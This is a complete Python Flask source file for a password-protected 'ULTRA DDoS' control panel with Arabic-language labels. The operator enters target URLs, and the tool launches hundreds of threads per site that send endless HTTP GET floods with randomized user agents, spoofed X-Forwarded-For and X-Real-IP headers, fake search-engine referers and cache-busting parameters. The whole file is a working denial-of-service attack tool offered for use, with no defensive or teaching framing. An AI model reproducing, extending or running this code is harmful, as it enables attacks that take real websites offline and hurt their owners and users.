from flask import Flask, jsonify, request, render_template_string, Response, redirect, url_for, session
import requests
import threading
import urllib3
import time
import random
from fake_useragent import UserAgent
from functools import wraps
from bs4 import BeautifulSoup
import base64

app = Flask(__name__)
app.secret_key = "sEcret76756vjvjv455"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ua = UserAgent()

targets = []
stats = {"good": {}, "failed": 0}
threads_info = {}
lock = threading.Lock()
default_threads = 250

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def generate_headers():
    rand_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "DNT": "1",
        "Referer": random.choice([
            "https://www.google.com/search?q=",
            "https://www.bing.com/search?q=",
            "https://search.yahoo.com/search?p=",
            "https://duckduckgo.com/?q=",
        ]),
        "X-Forwarded-For": rand_ip,
        "X-Real-IP": rand_ip,
        "Forwarded": f"for={rand_ip}",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }

def attack(url):
    while True:
        try:
            fake_params = f"?id={random.randint(1000,9999)}&t={time.time()}"
            full_url = url + fake_params
            headers = generate_headers()
            r = requests.get(full_url, headers=headers, verify=False, timeout=10)
            code = r.status_code
            with lock:
                key = f"{url} [{code}]"
                stats["good"].setdefault(key, 0)
                stats["good"][key] += 1
        except Exception:
            with lock:
                stats["failed"] += 1

def start_threads_for_url(url, count):
    threads_info[url] = []
    for _ in range(count):
        t = threading.Thread(target=attack, args=(url,))
        t.daemon = True
        t.start()
        threads_info[url].append(t)

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = ""
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if username == 'MOREBI' and password == 'morebi76':
            session['logged_in'] = True
            return redirect('/')
        else:
            error = "خطأ في اسم المستخدم أو كلمة المرور"
    
    return render_template_string("""
    <html><head><title>Login</title>
    <style>
        body { background:#111; color:#eee; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
        form { background:#222; padding:30px; border-radius:10px; box-shadow:0 0 15px #0f0; width:300px; }
        input, button { width:100%; padding:10px; margin:10px 0; border:none; border-radius:5px; }
        button { background:#0f0; color:#000; font-weight:bold; }
    </style>
    </head>
    <body>
        <form method="POST">
            <h2 style="text-align:center;">لوحة الدخول</h2>
            <input name="username" placeholder="اسم المستخدم">
            <input name="password" type="password" placeholder="كلمة المرور">
            <button type="submit">تسجيل الدخول</button>
            {% if error %}<p style="color:red;">{{ error }}</p>{% endif %}
        </form>
    </body></html>
    """, error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/')
@login_required
def dashboard():
    titles = {}
    with lock:
        for t in targets:
            try:
                r = requests.get(t, headers=generate_headers(), timeout=5, verify=False)
                soup = BeautifulSoup(r.text, 'html.parser')
                titles[t] = soup.title.string if soup.title else "No Title"
            except:
                titles[t] = "Error fetching"
        return render_template_string("""
            <html>
            <head>
                <title>MOREBI - ULTRA DDoS</title>
                <style>
                    body { font-family: Arial, background-color: #111; color: #eee; padding: 40px; }
                    h1 { color: #00ff99; }
                    input, button { padding: 8px; border: none; border-radius: 5px; }
                    input[type=text], input[type=number] { width: 300px; }
                    button { background: #00ff99; color: #000; }
                    .target { margin: 8px 0; padding: 6px; background: #222; border-left: 4px solid #00ff99; }
                    .statbox { background: #222; padding: 10px; margin-top: 20px; border-radius: 8px; }
                    pre { background: #000; padding: 10px; border-radius: 5px; }
                    a { color: #00ffcc; text-decoration: none; }
                </style>
            </head>
            <body>
                <h1>لوحة فشخ العيال</h1>
                <a href="/logout">تسجيل الخروج</a>
                <h2>العيال يلي ب تتفشخ:</h2>
                {% for t in targets %}
                    <div class="target">
                        <b>{{ t }}</b><br>
                        <small>{{ titles[t] }}</small><br>
                        <form method="post" action="/remove" style="display:inline;">
                            <input type="hidden" name="url" value="{{ t }}">
                            <button type="submit">حذف</button>
                        </form>
                    </div>
                {% else %}
                    <p>مفيش عيال حاليا .</p>
                {% endfor %}

                <form method="post" action="/add">
                    <input type="text" name="url" placeholder="https://example.com">
                    <input type="number" name="threads" placeholder="Threads (default 250)">
                    <button type="submit">إضافة هدف</button>
                </form>

                <div class="statbox">
                    <h2>الإحصائيات الحية</h2>
                    <pre>{{ stats | tojson(indent=2) }}</pre>
                </div>
            </body>
            </html>
        """, targets=targets, stats=stats, titles=titles)

@app.route('/add', methods=['POST'])
@login_required
def add():
    url = request.form.get("url")
    threads = request.form.get("threads")
    try:
        threads = int(threads)
    except:
        threads = default_threads
    if not url: return "Invalid URL", 400
    if not url.startswith("http"): url = "https://" + url
    if url not in targets:
        targets.append(url)
        start_threads_for_url(url, threads)
    return redirect('/')

@app.route('/remove', methods=['POST'])
@login_required
def remove():
    url = request.form.get("url")
    if url in targets:
        targets.remove(url)
    return redirect('/')

@app.route('/target=<path:url>')
@login_required
def add_by_path(url):
    url = url if url.startswith("http") else "https://" + url
    if url not in targets:
        targets.append(url)
        start_threads_for_url(url, default_threads)
        return f"Started threads for {url} <a href='/'>Back</a>"
    return f"Already running. <a href='/'>Back</a>"

@app.route('/api')
@login_required
def api():
    with lock:
        titles = {}
        for t in targets:
            try:
                r = requests.get(t, headers=generate_headers(), timeout=5, verify=False)
                soup = BeautifulSoup(r.text, 'html.parser')
                titles[t] = soup.title.string if soup.title else "No Title"
            except:
                titles[t] = "Error fetching"
        return jsonify({"stats": stats, "titles": titles})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)